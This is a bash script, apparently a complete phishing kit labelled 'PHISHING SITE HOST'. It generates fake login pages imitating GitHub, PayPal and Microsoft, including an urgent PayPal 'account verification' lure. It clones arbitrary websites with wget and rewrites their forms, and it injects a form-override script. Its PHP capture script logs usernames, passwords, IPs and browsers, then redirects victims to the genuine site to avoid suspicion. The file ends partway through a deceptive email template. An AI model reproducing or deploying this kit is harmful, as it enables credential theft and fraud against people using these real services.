#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Banner
echo -e "${YELLOW}"
echo "╔═════════════════════════════════════════════════╗"
echo "║                                                 ║"
echo "║         PHISHING SITE HOST                      ║"
echo "║                                                 ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check if required tools are installed
check_dependencies() {
    missing_deps=()
    
    # Check for wget
    if ! command -v wget &> /dev/null; then
        missing_deps+=("wget")
    fi
    
    # Check for php
    if ! command -v php &> /dev/null; then
        missing_deps+=("php")
    fi
    
    # Check for sed
    if ! command -v sed &> /dev/null; then
        missing_deps+=("sed")
    fi
    
    # Install missing dependencies
    if [ ${#missing_deps[@]} -ne 0 ]; then
        echo -e "${YELLOW}[INFO]${NC} Installing missing dependencies: ${missing_deps[*]}"
        apt-get update -qq && apt-get install -y "${missing_deps[@]}"
    fi
}

# Check dependencies
check_dependencies

# Load environment variables
if [ -f .env ]; then
    source .env
    echo -e "${YELLOW}[INFO]${NC} Loaded configuration from .env"
else
    echo -e "${RED}[ERROR]${NC} .env file not found. Creating from example..."
    cp .env.example .env
    echo -e "${YELLOW}[INFO]${NC} Created .env from example. Please edit it with your details:"
    echo -e "nano .env"
    exit 1
fi

# Create phishing site directory if it doesn't exist
mkdir -p phishing_site
cd phishing_site

# Function to create default phishing login page
create_default_page() {
    echo -e "${YELLOW}[INFO]${NC} Creating default phishing login page..."
    cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Lumon Industries - Employee Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            width: 200px;
        }
        h2 {
            text-align: center;
            color: #003366;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 12px;
            background-color: #003366;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #002244;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://via.placeholder.com/200x60?text=Lumon+Industries" alt="Lumon Industries">
        </div>
        <h2>Employee Portal Login</h2>
        <form action="credentials.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            &copy; 2023 Lumon Industries. All rights reserved.
        </div>
    </div>
</body>
</html>
EOF
}

# Function to create a specialized GitHub login form
create_github_page() {
    echo -e "${YELLOW}[INFO]${NC} Creating specialized GitHub login page..."
    cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 1.5;
            color: #24292e;
            background-color: #f6f8fa;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            width: 340px;
            margin: 0 auto;
        }
        .logo {
            display: block;
            margin: 40px auto 15px;
            width: 48px;
            height: 48px;
        }
        .login-form {
            padding: 20px;
            background-color: #fff;
            border: 1px solid #d8dee2;
            border-radius: 5px;
            margin-bottom: 16px;
        }
        .login-form h1 {
            margin-bottom: 15px;
            font-size: 24px;
            font-weight: 300;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 7px;
            font-weight: 600;
            font-size: 14px;
        }
        .form-control {
            padding: 6px 12px;
            font-size: 14px;
            width: 100%;
            border: 1px solid #d1d5da;
            border-radius: 3px;
            outline: none;
            box-sizing: border-box;
            height: 32px;
        }
        .form-control:focus {
            border-color: #2188ff;
            box-shadow: 0 0 0 3px rgba(3, 102, 214, 0.3);
        }
        .btn {
            background-color: #2ea44f;
            color: #fff;
            padding: 6px 12px;
            font-size: 14px;
            font-weight: 600;
            border: 1px solid rgba(27, 31, 35, 0.15);
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            height: 32px;
            margin-top: 15px;
        }
        .btn:hover {
            background-color: #2c974b;
        }
        .signin-link {
            color: #0366d6;
            text-decoration: none;
        }
        .signin-link:hover {
            text-decoration: underline;
        }
        .login-callout {
            padding: 15px 20px;
            text-align: center;
            border: 1px solid #d8dee2;
            border-radius: 5px;
            background-color: #fff;
        }
        .footer {
            margin: 40px auto;
            text-align: center;
            font-size: 12px;
            color: #6a737d;
            max-width: 500px;
        }
        .footer-links {
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #0366d6;
            text-decoration: none;
            margin: 0 5px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE2IDBDNy4xNiAwIDAgNy4xNiAwIDE2QzAgMjMuMDggNC41OCAyOS4wNiAxMC45NCAzMS4xOEMxMS43NCAzMS4zMiAxMi4wNCAxNC44NCAxMi4wNCAxNC40QzEyLjA0IDE0LjQgMTEuOTIgMTMuOTggMTEuOTIgMTMuNDZDMTEuOTIgMTIuNDYgMTIuNSAxMS40MiAxMi42NCAxMS4xQzEwLjMgMTAuOCA2LjE2IDguMTggNi4xNiA0LjE2QzYuMTYgMi40NiA2Ljg0IDAuODYgOC4wMiAtMC4wMkM4LjIyIC0wLjE2IDguMzYgLTAuMDYgOC40NCAwLjA4QzguNDQgMC4wOCAxMC40MiAzLjA0IDEyLjU2IDQuMzRDMTMuNzggNC4xNiAxNC42IDQuMSAxNS40MiA0LjFDMTYuMjIgNC4xIDE3LjAyIDQuMTYgMTguMjQgNC4zNEMyMC40IDMuMDQgMjIuMzggMC4xIDIyLjM4IDAuMUMyMi40NCAtMC4wNiAyMi42IC0wLjE0IDIyLjc4IC0wLjAyQzI0IDEuMSAyNC42NiAyLjggMjQuNjYgNC4xNkMyNC42NiA4LjI0IDIwLjQgMTAuODQgMTguMDYgMTEuMTJDMTguMjYgMTEuNTggMTguODQgMTIuODYgMTguODQgMTQuMUMxOC44NCAxNS40NCAxOC44IDE4LjEyIDE4Ljc4IDIwLjM0QzE4Ljc4IDIxLjA4IDE4Ljc2IDIxLjggMTguNzYgMjIuNUMxOC43NCAyMy4yMiAxOC43NCAyMy45MiAxOC43NCAyNC41OEMxOC43NCAyNS4xNiAxOC43NiAyNS42OCAxOC44IDI2LjA0QzE4Ljg4IDI2Ljg4IDE5LjA0IDI3LjQgMTkuODQgMjcuNjJDMjEuNTYgMjguMDggMjQgMjcuNTQgMjUuMTYgMjYuOTZDMjcuMzIgMjUuODggMjkuMyAyNC4xIDMwLjY2IDIxLjc0QzMxLjUgMjAuMjYgMzIgMTggMzIgMTZDMzIgNy4xNiAyNC44NCAwIDE2IDBaIiBmaWxsPSIjMjQyOTJlIi8+PC9zdmc+" class="logo" alt="GitHub">
            <div class="login-form">
                <h1>Sign in to GitHub</h1>
                <form action="credentials.php" method="post">
                    <div class="form-group">
                        <label for="login_field">Username or email address</label>
                        <input type="text" name="login" id="login_field" class="form-control" autocapitalize="off" autocorrect="off" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" name="password" id="password" class="form-control" required>
                    </div>
                    <input type="submit" name="commit" value="Sign in" class="btn" data-disable-with="Signing in...">
                </form>
            </div>
            <div class="login-callout">
                <span>New to GitHub? </span>
                <a href="#" class="signin-link">Create an account</a>.
            </div>
        </div>
        <div class="footer">
            <div class="footer-links">
                <a href="#">Terms</a>
                <a href="#">Privacy</a>
                <a href="#">Security</a>
                <a href="#">Contact GitHub</a>
            </div>
        </div>
    </div>
</body>
</html>
EOF
}

# Function to create a specialized PayPal login form
create_paypal_page() {
    echo -e "${YELLOW}[INFO]${NC} Creating specialized PayPal login page..."
    cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal: Account Verification Required</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 600px;
            margin: 40px auto;
            background-color: #ffffff;
            border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
        }
        .header {
            background-color: #0070ba;
            padding: 20px;
            text-align: center;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }
        .logo {
            color: white;
            font-size: 26px;
            font-weight: bold;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        .content {
            padding: 30px;
        }
        .title {
            color: #2c2e2f;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .login-form {
            border: 1px solid #ccc;
            padding: 20px;
            border-radius: 5px;
            background-color: #fff;
            margin: 20px 0;
        }
        .form-input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .submit-button {
            background-color: #0070ba;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .footer {
            background-color: #f5f5f5;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #666666;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">PayPal</div>
        </div>
        <div class="content">
            <div class="title">Important: Action Required on Your PayPal Account</div>
            <p>Dear valued customer,</p>
            <p>We've detected unusual activity in your PayPal account. To ensure your account security and prevent any unauthorized transactions, we need you to verify your information immediately.</p>
            <p><strong>If you do not verify your account within 24 hours, your account will be limited and pending transactions may be canceled.</strong></p>

            <div class="login-form">
                <h3>Please verify your PayPal account</h3>
                <form action="credentials.php" method="post">
                    <label for="email">Email or phone number</label>
                    <input type="text" id="email" name="email" class="form-input" required>
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" class="form-input" required>
                    <button type="submit" class="submit-button">Log In</button>
                </form>
            </div>

            <p>If you did not initiate this request, we recommend changing your password immediately after verification.</p>
            <p>Thank you for your prompt attention to this matter.</p>
            <p>Sincerely,<br>PayPal Account Services</p>
        </div>
        <div class="footer">
            <p>This message contains confidential information and is intended only for the recipient mentioned above. If you have received this email in error, please contact PayPal Customer Service.</p>
            <p>&copy; 2023 PayPal, Inc. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
EOF
}

# Function to create a specialized Microsoft/Outlook login form
create_microsoft_page() {
    echo -e "${YELLOW}[INFO]${NC} Creating specialized Microsoft login page..."
    cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 440px;
            background-color: white;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            padding: 44px;
            max-width: 440px;
        }
        .logo {
            margin-bottom: 16px;
        }
        .logo img {
            width: 108px;
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #1B1B1B;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            padding: 6px 10px;
            font-size: 15px;
            border: 1px solid #8A8A8A;
            height: 36px;
            outline: none;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #0067b8;
        }
        button {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 0 12px;
            font-size: 15px;
            height: 32px;
            min-width: 108px;
            cursor: pointer;
            float: right;
            margin-top: 12px;
        }
        button:hover {
            background-color: #005da6;
        }
        .footer {
            margin-top: 30px;
            text-align: left;
            font-size: 13px;
            color: #666;
        }
        .footer a {
            color: #0067b8;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24">
                <path fill="#737373" d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1.01,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6a5.358,5.358,0,0,1,1.386-3.887,5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,103.167,7.3V8.507h3.254V6.283l2.329-.712V8.507h2.329v1.906h-2.329v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/>
                <path fill="#F25022" d="M0 0h10.931v10.931H0z"/>
                <path fill="#7FBA00" d="M12.069 0H23v10.931H12.069z"/>
                <path fill="#00A4EF" d="M0 12.069h10.931V23H0z"/>
                <path fill="#FFB900" d="M12.069 12.069H23V23H12.069z"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <form action="credentials.php" method="post">
            <div class="form-group">
                <input type="text" name="email" placeholder="Email, phone, or Skype" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <div>
                <button type="submit">Sign in</button>
            </div>
        </form>
        <div class="footer">
            <p>No account? <a href="#">Create one!</a></p>
            <p><a href="#">Can't access your account?</a></p>
        </div>
    </div>
</body>
</html>
EOF
}

# Function to force all form actions to point to credentials.php
# This ensures that all forms will submit to our credential capture script
force_form_actions() {
    local html_file="$1"
    
    echo -e "${YELLOW}[INFO]${NC} Ensuring all forms submit to credential capture script..."
    
    # Create a backup of the file
    cp "$html_file" "${html_file}.bak"
    
    # Check if we need to modify the file
    if grep -q '<form' "$html_file"; then
        # Use a safer method to modify forms with sed
        sed -i.tmp -e 's/<form[^>]*>/<form action="credentials.php" method="post">/g' "$html_file"
        
        # Remove temporary files
        rm -f "${html_file}.tmp"
        
        echo -e "${GREEN}[SUCCESS]${NC} Modified forms to submit to credential capture script"
    else
        echo -e "${YELLOW}[INFO]${NC} No forms found in $html_file"
    fi
}

# Function to ensure jQuery or JavaScript doesn't interfere with form submissions
add_form_override_script() {
    local html_file="$1"
    
    echo -e "${YELLOW}[INFO]${NC} Adding script to override form submissions..."
    
    # Add JavaScript to the end of the body to override any form submissions
    # This will ensure all forms submit to our credentials.php regardless of any JavaScript handlers
    if grep -q '</body>' "$html_file"; then
        sed -i.tmp -e 's|</body>|<script>\
            document.addEventListener("DOMContentLoaded", function() {\
                var forms = document.getElementsByTagName("form");\
                for(var i=0; i<forms.length; i++) {\
                    forms[i].action = "credentials.php";\
                    forms[i].method = "post";\
                    forms[i].addEventListener("submit", function(e) {\
                        e.preventDefault();\
                        this.action = "credentials.php";\
                        this.method = "post";\
                        this.submit();\
                    });\
                }\
            });\
        </script></body>|g' "$html_file"
        
        # Remove temporary files
        rm -f "${html_file}.tmp"
        
        echo -e "${GREEN}[SUCCESS]${NC} Added form override script"
    else
        # If no </body> tag, just append the script at the end of the file
        echo '<script>
            document.addEventListener("DOMContentLoaded", function() {
                var forms = document.getElementsByTagName("form");
                for(var i=0; i<forms.length; i++) {
                    forms[i].action = "credentials.php";
                    forms[i].method = "post";
                    forms[i].addEventListener("submit", function(e) {
                        e.preventDefault();
                        this.action = "credentials.php";
                        this.method = "post";
                        this.submit();
                    });
                }
            });
        </script>' >> "$html_file"
        
        echo -e "${GREEN}[SUCCESS]${NC} Appended form override script to file"
    fi
}

# Function to clone a website
clone_website() {
    local target_url=$1
    local clone_dir="cloned_site"
    local redirect_url=""
    local domain=""
    
    # Extract the domain from the URL for better handling
    domain=$(echo "$target_url" | sed -E 's|^https?://([^/]+).*|\1|')
    echo -e "${YELLOW}[INFO]${NC} Extracted domain: $domain"
    
    # Set appropriate redirect URL based on target
    if [[ "$target_url" == *"github.com"* ]]; then
        redirect_url="https://github.com"
        # For GitHub, use our specialized template which works better than cloning
        create_github_page
        echo -e "${GREEN}[SUCCESS]${NC} Created specialized GitHub login page"
        # Store the redirect URL for the credential script to use
        echo "$redirect_url" > redirect_url.txt
        return 0
    elif [[ "$target_url" == *"paypal.com"* ]]; then
        redirect_url="https://www.paypal.com"
        # For PayPal, use our specialized template
        create_paypal_page
        echo -e "${GREEN}[SUCCESS]${NC} Created specialized PayPal login page"
        # Store the redirect URL for the credential script to use
        echo "$redirect_url" > redirect_url.txt
        return 0
    elif [[ "$target_url" == *"microsoft.com"* ]] || [[ "$target_url" == *"live.com"* ]] || [[ "$target_url" == *"outlook.com"* ]]; then
        redirect_url="https://www.microsoft.com"
        # For Microsoft, use our specialized template
        create_microsoft_page
        echo -e "${GREEN}[SUCCESS]${NC} Created specialized Microsoft login page"
        # Store the redirect URL for the credential script to use
        echo "$redirect_url" > redirect_url.txt
        return 0
    elif [[ "$target_url" == *"google.com"* ]]; then
        redirect_url="https://www.google.com"
    elif [[ "$target_url" == *"reddit.com"* ]]; then
        redirect_url="https://www.reddit.com"
    elif [[ "$target_url" == *"facebook.com"* ]]; then
        redirect_url="https://www.facebook.com"
    elif [[ "$target_url" == *"twitter.com"* ]] || [[ "$target_url" == *"x.com"* ]]; then
        redirect_url="https://twitter.com"
    elif [[ "$target_url" == *"linkedin.com"* ]]; then
        redirect_url="https://www.linkedin.com"
    elif [[ "$target_url" == *".edu"* ]]; then
        # For educational institutions, try to redirect to the main site
        redirect_url="https://${domain}"
    else
        # Extract just the domain for generic cases
        redirect_url="https://${domain}"
    fi
    
    echo -e "${YELLOW}[INFO]${NC} Setting redirect to: $redirect_url"
    
    # Store the redirect URL for the credential script to use
    echo "$redirect_url" > redirect_url.txt
    
    # Create temporary directory for cloning
    mkdir -p "$clone_dir"
    
    echo -e "${YELLOW}[INFO]${NC} Cloning website: $target_url"
    
    # Download the website with wget
    wget --quiet \
         --no-parent \
         --no-check-certificate \
         --page-requisites \
         --convert-links \
         --adjust-extension \
         --span-hosts \
         --domains=$domain \
         --directory-prefix="$clone_dir" \
         --max-redirect=2 \
         --tries=3 \
         --timeout=30 \
         --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36" \
         "$target_url"
    
    if [ $? -ne 0 ]; then
        echo -e "${RED}[ERROR]${NC} Failed to clone website. Using default login page."
        create_default_page
        return 1
    fi
    
    # Find all HTML files in the cloned directory
    echo -e "${YELLOW}[INFO]${NC} Modifying forms to capture credentials..."
    find "$clone_dir" -name "*.html" -o -name "*.htm" | while read html_file; do
        # Look for forms and modify them to submit to our credential capture script
        sed -i 's/<form[^>]*action="[^"]*"/<form action="credentials.php"/g' "$html_file"
        sed -i 's/<form[^>]*action='\''[^'\'']*'\''/<form action='\''credentials.php'\''/g' "$html_file"
        # For forms without an action attribute
        sed -i 's/<form[^>]*>/<form action="credentials.php" method="post">/g' "$html_file"
        
        # Add JavaScript to override form submissions
        add_form_override_script "$html_file"
    done
    
    # Find the main HTML file (usually index.html)
    local main_html=$(find "$clone_dir" -name "index.html" -o -name "index.htm" -o -name "default.html" | head -1)
    
    # If no index file found, use the first HTML file
    if [ -z "$main_html" ]; then
        main_html=$(find "$clone_dir" -name "*.html" -o -name "*.htm" | head -1)
    fi
    
    # If we found a main HTML file, copy it to our root
    if [ -n "$main_html" ]; then
        echo -e "${YELLOW}[INFO]${NC} Using $main_html as the main page"
        cp "$main_html" index.html
        
        # Force all forms to submit to credentials.php and add override script
        force_form_actions "index.html"
        add_form_override_script "index.html"
        
        # Copy all other files in the directory to the current directory
        cp -r "$clone_dir"/* ./
    else
        echo -e "${RED}[ERROR]${NC} No HTML files found in cloned site. Using default login page."
        create_default_page
    fi
    
    # Clean up
    rm -rf "$clone_dir"
    
    echo -e "${GREEN}[SUCCESS]${NC} Website cloned and configured for credential harvesting"
}

# Check if a URL was provided as argument
if [ -n "$1" ]; then
    # Clone the provided website
    clone_website "$1"
else
    # Use default login page
    create_default_page
fi

# Create credential capture script regardless of the website used
echo -e "${YELLOW}[INFO]${NC} Creating credential capture script..."
cat > credentials.php << 'EOF'
<?php
// Log file to store captured credentials
$log_file = 'captured_credentials.txt';

// Get the current date and time
$date = date('Y-m-d H:i:s');

// Get the visitor's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the user agent (browser info)
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get the referer URL (where they came from)
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';

// Initialize credential variables
$username = '';
$password = '';

// Function to log credentials and debug info
function logDebug($message) {
    error_log("[DEBUG] " . $message);
}

// Log raw POST data
logDebug("Raw POST data: " . print_r($_POST, true));

// Check for POST data (form submission)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Dump all POST data to error log for debugging
    logDebug("All POST fields: " . print_r($_POST, true));
    
    // Handle GitHub's login form fields
    if (isset($_POST['login']) && !empty($_POST['login'])) {
        $username = $_POST['login'];
    }
    
    // Directly check for 'password' field which is common across most forms
    if (isset($_POST['password']) && !empty($_POST['password'])) {
        $password = $_POST['password'];
        logDebug("Found password field with value length: " . strlen($password));
    } else {
        logDebug("No 'password' field found, searching for alternatives");
    }
    
    // If no direct password field, look for alternatives by name pattern
    if (empty($password)) {
        foreach ($_POST as $key => $value) {
            logDebug("Checking field: $key with value length: " . strlen($value));
            
            // Username fields
            if (empty($username) && 
                (stripos($key, 'user') !== false || 
                 stripos($key, 'email') !== false || 
                 stripos($key, 'login') !== false || 
                 stripos($key, 'id') !== false || 
                 stripos($key, 'account') !== false || 
                 stripos($key, 'name') !== false || 
                 stripos($key, 'mail') !== false)) {
                $username = $value;
                logDebug("Found username in field: $key");
            }
            
            // Password fields
            if (empty($password) && 
                (stripos($key, 'pass') !== false || 
                 stripos($key, 'pwd') !== false || 
                 stripos($key, 'secret') !== false || 
                 stripos($key, 'pw') !== false)) {
                $password = $value;
                logDebug("Found password in field: $key");
            }
        }
    }
    
    // Last resort: if still no username/password, use the first two non-empty fields
    if (empty($username) || empty($password)) {
        logDebug("Using fallback method to find credentials");
        $values = array_filter(array_values($_POST), function($val) { return !empty($val); });
        
        if (count($values) >= 1 && empty($username)) {
            $username = $values[0];
            logDebug("Set username from first non-empty value");
        }
        
        if (count($values) >= 2 && empty($password)) {
            $password = $values[1];
            logDebug("Set password from second non-empty value");
        }
    }
    
    // Format log entry
    $log_entry = "==================================\n";
    $log_entry .= "Date: $date\n";
    $log_entry .= "IP Address: $ip\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "Referer: $referer\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n";
    
    // Log all form fields
    $log_entry .= "\nAll form fields:\n";
    foreach ($_POST as $key => $value) {
        $log_entry .= "$key: $value\n";
    }
    
    $log_entry .= "==================================\n\n";
    
    // Write to log file
    file_put_contents($log_file, $log_entry, FILE_APPEND);

    // Output to the browser (this will be seen in the PHP error log)
    error_log("CREDENTIALS CAPTURED - Username: $username, Password: $password");
    
    // Console output for real-time monitoring
    echo "SUCCESS! Credentials captured:\nUsername: $username\nPassword: $password\n";
    
    // Determine where to redirect
    $redirect = 'https://www.google.com'; // Default fallback
    
    // Check if we have a custom redirect URL
    if (file_exists('redirect_url.txt')) {
        $custom_redirect = trim(file_get_contents('redirect_url.txt'));
        if (!empty($custom_redirect)) {
            $redirect = $custom_redirect;
        }
    }
    
    logDebug("Redirecting to: " . $redirect);
    
    // Redirect to a legitimate site (to avoid suspicion)
    header('Location: ' . $redirect);
    exit;
}
?>
EOF

# Go back to parent directory
cd ..

# Create HTML email template if it doesn't exist
if [ ! -f html_email_template.html ]; then
    echo -e "${YELLOW}[INFO]${NC} Creating HTML email template..."
    cat > html_email_template.html << EOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Urgent: Account Security Verification Required</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; line-height: 1.6;">
    <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; border-collapse: collapse;">
        <!-- HEADER WITH LOGO -->
        <tr>
            <td align="center" bgcolor="#003366" style="padding: 20px 0;">
